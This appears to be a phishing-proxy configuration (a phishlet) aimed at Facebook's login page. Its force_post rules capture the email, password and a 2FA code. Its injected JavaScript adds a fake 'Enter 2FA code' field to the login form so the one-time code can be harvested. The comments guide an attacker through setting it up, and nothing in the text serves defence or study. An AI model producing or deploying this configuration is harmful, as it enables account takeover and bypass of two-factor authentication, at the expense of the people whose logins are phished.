# After capturing the username and password, you can add a section to capture the 2FA code.
force_post:
  # Intercepting and modifying POST data on the login path.
  - path: '/login.php'
    search:
      - {key: 'email', search: '.*'}
      - {key: 'pass', search: '.*'}
    type: 'post'

  # Capturing the 2FA code after the first login attempt
  - path: '/login/2fa'  # Adjust to the correct path for the 2FA submission
    search:
      - {key: '2fa_code', search: '(.*)'}  # Capture the 2FA code
    type: 'post'

# Add logic in your JS to show the 2FA input field after initial login.
js_inject:
  - trigger_domains: ["www.facebook.com"]
    trigger_paths: ["/login.php"]
    script: |
      // After submitting the username and password, show a prompt for the 2FA code.
      var submit = document.querySelector('button[type=submit]');
      submit.addEventListener('click', function() {
          // Wait for the login response, and if it indicates a 2FA request, show the 2FA input field.
          setTimeout(function() {
              var twoFactorField = document.createElement('input');
              twoFactorField.setAttribute('type', 'text');
              twoFactorField.setAttribute('name', '2fa_code');
              twoFactorField.setAttribute('placeholder', 'Enter 2FA code');
              document.querySelector('form').appendChild(twoFactorField);
          }, 3000);  // Adjust timing as necessary.
      });
